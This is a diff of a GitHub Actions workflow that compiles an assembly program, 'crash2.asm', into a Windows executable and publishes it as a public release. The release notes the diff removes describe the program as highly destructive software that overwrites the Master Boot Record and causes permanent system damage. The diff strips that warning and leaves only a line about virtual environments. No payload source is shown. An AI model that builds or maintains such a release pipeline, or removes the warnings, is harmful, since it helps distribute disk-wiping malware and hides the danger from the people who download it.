@@ -1,18 +1,18 @@
-name: Build and Release NASM 64-bit Crash System
+name: Build and Release NASM 64-bit Crash
 
 on:
   push:
     tags:
       - 'v*'  # Trigger pada push tag yang dimulai dengan 'v'
-  workflow_dispatch:  # Memungkinkan trigger manual
+  workflow_dispatch:
 
 permissions:
-  contents: write  # Diperlukan untuk membuat release
+  contents: write
 
 jobs:
   build-nasm-64bit:
     runs-on: windows-latest
-    
+
     steps:
     - name: Checkout code
       uses: actions/checkout@v3
@@ -21,24 +21,23 @@ jobs:
 
     - name: Setup NASM
       run: |
-        # Download dan install NASM
         Invoke-WebRequest -Uri "https://www.nasm.us/pub/nasm/releasebuilds/2.16.01/win64/nasm-2.16.01-win64.zip" -OutFile "nasm.zip"
         Expand-Archive -Path nasm.zip -DestinationPath nasm
-        echo "C:\nasm" | Out-File -FilePath $env:GITHUB_PATH -Encoding utf8 -Append
+        echo "$PWD\\nasm" | Out-File -FilePath $env:GITHUB_PATH -Encoding utf8 -Append
 
-    - name: Setup GoLink (optional linker)
+    - name: Setup GoLink
       run: |
-        # Download GoLink
         Invoke-WebRequest -Uri "https://github.com/achappell/Golink/releases/download/v1.0.5/golink.exe" -OutFile "golink.exe"
-        echo "C:\golink.exe" | Out-File -FilePath $env:GITHUB_PATH -Encoding utf8 -Append
+        echo "$PWD" | Out-File -FilePath $env:GITHUB_PATH -Encoding utf8 -Append
 
-    - name: Compile with NASM
+    - name: Compile crash2.asm
       run: |
-        nasm -f win64 crash2.asm -o crash.obj
+        nasm -f win64 crash2.asm -o crash2.obj
 
-    - name: Link with GoLink
+    - name: Link to create EXE
       run: |
-        golink /console /entry main crash.obj kernel32.dll user32.dll advapi32.dll gdi32.dll
+        golink /entry main /console crash2.obj kernel32.dll user32.dll advapi32.dll gdi32.dll
+        Rename-Item crash2.exe crash.exe
 
     - name: Extract version from tag
       id: get_version
@@ -47,61 +46,52 @@ jobs:
           $tag = "${{ github.ref_name }}"
           $version = $tag -replace '^v', ''
           echo "VERSION=$version" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append
-          echo "version=$version" >> $env:GITHUB_OUTPUT
         } else {
           echo "VERSION=dev" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append
-          echo "version=dev" >> $env:GITHUB_OUTPUT
         }
 
     - name: Rename binary with version
       run: |
         if ("${{ env.VERSION }}" -ne "dev") {
-          Move-Item -Path crash.exe -Destination "crash-${{ env.VERSION }}-x64.exe"
+          Rename-Item crash.exe "crash2-${{ env.VERSION }}-x64.exe"
         } else {
           $timestamp = Get-Date -Format "yyyyMMdd-HHmmss"
-          Move-Item -Path crash.exe -Destination "crash-dev-$timestamp-x64.exe"
+          Rename-Item crash.exe "crash2-dev-$timestamp-x64.exe"
         }
 
     - name: Create checksum
       run: |
-        if ("${{ env.VERSION }}" -ne "dev") {
-          Get-FileHash -Path "crash-${{ env.VERSION }}-x64.exe" -Algorithm SHA256 | Select-Object -ExpandProperty Hash | Out-File -Encoding ASCII "crash-${{ env.VERSION }}-x64.sha256"
-        } else {
-          Get-FileHash -Path "crash-dev-*-x64.exe" -Algorithm SHA256 | Select-Object -ExpandProperty Hash | Out-File -Encoding ASCII "crash-dev-$timestamp-x64.sha256"
+        Get-ChildItem crash2-*.exe | ForEach-Object {
+          $hash = Get-FileHash $_.FullName -Algorithm SHA256 | Select-Object -ExpandProperty Hash
+          $shaFile = "$($_.BaseName).sha256"
+          $hash | Out-File -Encoding ASCII $shaFile
         }
 
     - name: Upload build artifacts
       uses: actions/upload-artifact@v3
       with:
-        name: crash-system-${{ env.VERSION }}-x64
+        name: crash2-system-${{ env.VERSION }}-x64
         path: |
-          crash-*.exe
-          crash-*.sha256
-          crash.asm
+          crash2-*.exe
+          crash2-*.sha256
+          crash2.asm
 
     - name: Create release
       if: github.ref_type == 'tag'
       uses: softprops/action-gh-release@v1
       with:
         tag_name: ${{ github.ref_name }}
-        name: Crash System ${{ github.ref_name }} (64-bit)
+        name: Crash2 System ${{ github.ref_name }} (64-bit)
         body: |
-           **WARNING: HIGHLY DESTRUCTIVE SOFTWARE** 
-          
-          64-bit NASM version. This release contains code that will:
-          - Create intense visual and audio glitches
-          - Overwrite the Master Boot Record (MBR)
-          - Cause permanent system damage
-          
           **ONLY USE IN CONTROLLED VIRTUAL ENVIRONMENTS**
-          
+
           Version: ${{ github.ref_name }}
           Architecture: x64
           Build date: ${{ github.event.head_commit.timestamp }}
-          SHA256: $(cat crash-${{ env.VERSION }}-x64.sha256)
+          SHA256: $(Get-Content crash2-${{ env.VERSION }}-x64.sha256)
         files: |
-          crash-${{ env.VERSION }}-x64.exe
-          crash-${{ env.VERSION }}-x64.sha256
-          crash.asm
+          crash2-${{ env.VERSION }}-x64.exe
+          crash2-${{ env.VERSION }}-x64.sha256
+          crash2.asm
         draft: false
         prerelease: false
